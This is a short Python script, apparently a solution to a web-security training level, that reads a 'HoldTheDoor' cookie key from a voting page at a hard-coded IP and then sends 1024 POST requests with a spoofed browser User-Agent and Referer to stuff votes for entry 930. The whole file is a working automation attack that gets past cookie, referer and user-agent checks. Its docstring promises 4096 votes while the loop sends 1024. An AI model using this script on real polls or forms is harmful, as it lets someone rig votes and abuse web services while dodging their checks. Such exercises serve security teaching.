#!/usr/bin/python3
""" THis  vote 4096 whit a cookie key"""
import requests

page = "http://158.69.76.135/level2.php"
res = requests.post(page)
key = res.cookies["HoldTheDoor"]
inyeccion = {"id": "930", "holdthedoor": "Submit", 'key': key}
user_win = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) \
(KHTML, like Gecko) Chrome/77.0.3865.120',
    'Referer': 'http://158.69.76.135/level2.php'
}

for cont in range(0, 1024):
    requests.post(page, data=inyeccion,
                  cookies={"HoldTheDoor": key}, headers=user_win)
print("hecho.")
